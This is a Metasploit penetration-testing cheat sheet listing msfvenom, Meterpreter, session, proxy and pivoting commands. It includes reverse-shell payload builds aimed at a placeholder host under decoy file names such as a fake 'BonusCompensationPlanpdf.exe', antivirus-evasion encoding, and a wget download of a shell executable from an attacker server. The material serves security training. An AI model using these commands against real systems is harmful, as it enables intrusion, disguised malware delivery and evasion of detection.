---
icon: cow
---

# Metasploit

## <mark style="color:yellow;">ABOUT</mark>

<mark style="color:red;">**Metasploit Project**</mark> is a Ruby-based, <mark style="color:purple;">**modular penetration testing platform**</mark> that enables you to write, test, and execute the exploit code. This exploit code can be custom-made by the user or taken from a database containing the latest already discovered and modularized exploits. The <mark style="color:green;">`Metasploit Framework`</mark> includes a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. At its core, the <mark style="color:green;">`Metasploit Project`</mark> is a collection of commonly used tools that provide a complete environment for penetration testing and exploit development. Files usually located at <mark style="color:green;">`/usr/share/metasploit-framework`</mark>.

* **What is MS Module?** A module is a piece of software that the Metasploit Framework uses to perform a task, such as exploiting or scanning a target. A module can be an exploit module, auxiliary module, or post-exploitation module.

## <mark style="color:yellow;">ARCHITECTURE</mark>

1. <mark style="color:blue;">**Auxiliary**</mark> - Any supporting module, such as scanners, crawlers and fuzzers.
2. <mark style="color:blue;">**Encoders**</mark> - Will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
3. <mark style="color:blue;">**Evasion**</mark> - While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success.
4. <mark style="color:blue;">**Exploits**</mark> - Exploits, neatly organized by target system.
5. <mark style="color:blue;">**NOPs**</mark> - <mark style="color:blue;">`(No Operation code)`</mark> Keep the payload sizes consistent across exploit attempts.
6. <mark style="color:blue;">**Payloads**</mark> - Payloads are codes that will run on the target system.
7. <mark style="color:blue;">**Post**</mark> - Post modules would be useful in post-exploitation.

## <mark style="color:yellow;">MSFVENOM</mark>

<mark style="color:red;">**Msfvenom**</mark> is a tool that is part of the Metasploit framework and it is a command line <mark style="color:purple;">**tool for generating different types of payloads for exploiting**</mark>**.** In addition to providing a payload with flexible delivery options, MSFvenom also allows us to **encrypt & encode** payloads to bypass common anti-virus detection signatures.

#### **List Payloads**

```bash
msfvenom -l payloads
```

#### **Building a Stageless Payload for Linux**

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=13.13.13.13 LPORT=443 -f elf > createbackup.elf
```

#### **Building a Stageless Payload for Windows**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=13.13.13.13 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

### <mark style="color:blue;">Staged vs Stageless Payloads</mark>

<mark style="color:blue;">**`Staged`**</mark>**&#x20;payloads create a way for us to send over more components of our attack.** So if more simply, the whole payload has few stages, first to get connection and others to load additional programs

<mark style="color:blue;">**`Stageless`**</mark>**&#x20;payloads do not have a stage.** So all payload and programs are loaded at first time.

## <mark style="color:yellow;">METERPRETER</mark>

<mark style="color:blue;">**`The Meterpreter`**</mark> payload is a specific type of multi-faceted payload that uses `DLL injection` to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques.

### <mark style="color:blue;">Encoder</mark>

* **Generating Payload - With Encoding**

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

* **List Encoders**

```bash
msf6 exploit(windows/smb/goose) > show encoders
```

* **MSF - VirusTotal**

```bash
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

### <mark style="color:blue;">Sessions</mark>

#### **Listing Active Sessions**

```bash
msf6 exploit(windows/smb/goose) > sessions
```

#### **Interacting with a Session**

```bash
msf6 exploit(windows/smb/goose) > sessions -i 1
```

#### **Getting shell**

```bash
msf6 exploit(windows/smb/goose) > shell
```

#### **Background session**

```bash
meterpreter > background
OR
Ctrl+Z
OR
meterpreter > bg
```

#### **Killing session**

```bash
msf6 exploit(windows/smb/goose) > sessions -k 1
```

#### **Listing Running Jobs**

```bash
msf6 exploit(multi/handler) > jobs -l
```

#### **Run an Exploit as a Background Job**

```bash
msf6 exploit(multi/handler) > exploit -j
```

## <mark style="color:yellow;">MAKING PROXY</mark>

<pre class="language-bash"><code class="lang-bash"><strong># Configuring 
</strong><strong>msf6 > use auxiliary/server/socks_proxy
</strong>msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
# Confirming proxy is running
auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
</code></pre>

## <mark style="color:yellow;">PIVOTING</mark>

### <mark style="color:blue;">Autoroute</mark>

<mark style="color:red;">**Autoroute**</mark> is used in penetration testing to enable <mark style="color:purple;">**network pivoting**</mark>, allowing attackers to route traffic through a compromised host to access internal **subnets** that are not directly reachable. This facilitates reconnaissance, exploitation, and lateral movement within isolated or segmented networks.

```bash
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 13.13.13.0
msf6 post(multi/manage/autoroute) > run
meterpreter > run autoroute -s 13.13.13.0/23
meterpreter > run autoroute -p # list active routes
```

### <mark style="color:blue;">Local Port-Forwarding</mark>

```bash
meterpreter > portfwd add -l 1234 -p 4321 -r 13.13.13.13
# Forward all packets on 1234 port to 4321 port on 13.13.13.13 host
```

### <mark style="color:blue;">Remote Port-Forwarding</mark>

```bash
meterpreter > portfwd add -R -l 1234 -p 4321 -L 13.13.13.13
# Forward all packets from 4321 port on 13.13.13.13 to our local 1234 port
```

## <mark style="color:yellow;">USEFUL MSFCONSOLE COMMANDS</mark>

#### **Specific Search**

```bash
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

#### **Get more info about module**

```bash
info
```

#### **Permanent Target Specification**

```bash
msf6 exploit(windows/smb/amogus) > setg RHOSTS 13.13.13.13
```

#### **Show and Set Target for exploit**

```bash
msf6 exploit(windows/browser/goose) > show targets
...
msf6 exploit(windows/browser/goose) > set target 3
```

#### **Searching for Specific Payload**

```bash
msf6 exploit(windows/smb/goose) > grep meterpreter grep reverse_tcp show payloads
```

#### **Use Local Exploit Suggester**

```bash
msf6 > search local exploit suggester
```

#### **Ping Sweep**

```bash
run post/multi/gather/ping_sweep RHOSTS=13.13.13.0/23
```

## <mark style="color:yellow;">LIFEHACKS</mark>

* Use wget -o parameter when you want to install revshell file into machine like:&#x20;

```
wget http://13.13.13.13:1337/shell.exe -o shell.exe
```
